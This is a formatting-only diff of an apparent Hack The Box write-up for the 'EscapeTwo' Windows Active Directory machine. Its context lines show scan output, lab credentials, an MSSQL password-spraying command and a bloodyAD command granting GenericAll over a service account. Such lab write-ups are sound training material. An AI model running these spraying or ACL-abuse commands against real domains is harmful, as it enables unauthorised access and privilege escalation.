@@ -1,9 +1,19 @@
 ---
 title: HTB - EscapeTwo (Easy)
 date: '2025-07-12'
-tags: ['machine', 'windows', 'Active Directory', 'MSSQL', 'WriteOwner', 'ESC4', 'ESC1', 'shadow-credentials']
+tags:
+  [
+    'machine',
+    'windows',
+    'Active Directory',
+    'MSSQL',
+    'WriteOwner',
+    'ESC4',
+    'ESC1',
+    'shadow-credentials',
+  ]
 draft: false
-summary: Initial Enumeration reveals an Excel file which discloses sensitive credentials that allow us to gain a foothold, then performing lateral movement to identify more credentials and gaining user access. Then, leveraging ACL misconfigurations to enumerate vulnerable cerificates which leads to ESC4. Thus, gaining DA 
+summary: Initial Enumeration reveals an Excel file which discloses sensitive credentials that allow us to gain a foothold, then performing lateral movement to identify more credentials and gaining user access. Then, leveraging ACL misconfigurations to enumerate vulnerable cerificates which leads to ESC4. Thus, gaining DA
 ---
 
 <TOCInline toc={props.toc} asDisclosure />
@@ -59,7 +69,7 @@ PORT     STATE SERVICE       VERSION
 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-07-12T03:57:12+00:00; -2s from scanner time.
-| ssl-cert: Subject: 
+| ssl-cert: Subject:
 | Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
 | Issuer: commonName=sequel-DC01-CA
 | Public Key type: rsa
@@ -71,17 +81,17 @@ PORT     STATE SERVICE       VERSION
 |_SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
 1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
 |_ssl-date: 2025-07-12T03:57:12+00:00; 0s from scanner time.
-| ms-sql-info: 
-|   10.129.245.75:1433: 
-|     Version: 
+| ms-sql-info:
+|   10.129.245.75:1433:
+|     Version:
 |       name: Microsoft SQL Server 2019 RTM
 |       number: 15.00.2000.00
 |       Product: Microsoft SQL Server 2019
 |       Service pack level: RTM
 |       Post-SP patches applied: false
 |_    TCP port: 1433
-| ms-sql-ntlm-info: 
-|   10.129.245.75:1433: 
+| ms-sql-ntlm-info:
+|   10.129.245.75:1433:
 |     Target_Name: SEQUEL
 |     NetBIOS_Domain_Name: SEQUEL
 |     NetBIOS_Computer_Name: DC01
@@ -100,7 +110,7 @@ PORT     STATE SERVICE       VERSION
 |_SHA-1: 8de6:5381:5d74:08e3:a1d2:a465:88e3:96da:2f12:5acb
 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-07-12T03:57:12+00:00; -2s from scanner time.
-| ssl-cert: Subject: 
+| ssl-cert: Subject:
 | Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
 | Issuer: commonName=sequel-DC01-CA
 | Public Key type: rsa
@@ -112,7 +122,7 @@ PORT     STATE SERVICE       VERSION
 |_SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
 3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-07-12T03:57:12+00:00; -2s from scanner time.
-| ssl-cert: Subject: 
+| ssl-cert: Subject:
 | Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
 | Issuer: commonName=sequel-DC01-CA
 | Public Key type: rsa
@@ -125,10 +135,10 @@ PORT     STATE SERVICE       VERSION
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-security-mode: 
-|   3:1:1: 
+| smb2-security-mode:
+|   3:1:1:
 |_    Message signing enabled and required
-| smb2-time: 
+| smb2-time:
 |   date: 2025-07-12T03:56:36
 |_  start_date: N/A
 |_clock-skew: mean: -1s, deviation: 1s, median: -2s
@@ -191,12 +201,13 @@ We have a hit on `oscar:86LxLBMgEWaKUnBG`
 
 ![Description](/static/images/htb/windows/escapetwo/5.jpg)
 
-Then I noticed the `sa` user with his odd password which maybe hinting he is a sysadmin at the MSSQL Server. I 
+Then I noticed the `sa` user with his odd password which maybe hinting he is a sysadmin at the MSSQL Server. I
 also sprayed it using the `mssql` protocol
 
 ```
 ❯ nxc mssql sequel.htb -u usernames.txt -p passwords.txt --continue-on-success --local-auth
 ```
+
 Spot On
 
 ![Description](/static/images/htb/windows/escapetwo/6.jpg)
@@ -296,10 +307,10 @@ But first we need to change the ownership of `ca_svc` to Ryan
 
 ![Description](/static/images/htb/windows/escapetwo/18.jpg)
 
-Now we give `ryan` `GenericAll` ACE over `ca_svc` 
+Now we give `ryan` `GenericAll` ACE over `ca_svc`
 
 ```
-❯ bloodyAD --host 10.129.245.75 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan          
+❯ bloodyAD --host 10.129.245.75 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
 ```
 
 ![Description](/static/images/htb/windows/escapetwo/19.jpg)
@@ -362,26 +373,3 @@ Nice, now can WinRM inside `Administrator` and get the root flag
 ```
 
 ![Description](/static/images/htb/windows/escapetwo/27.jpg)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
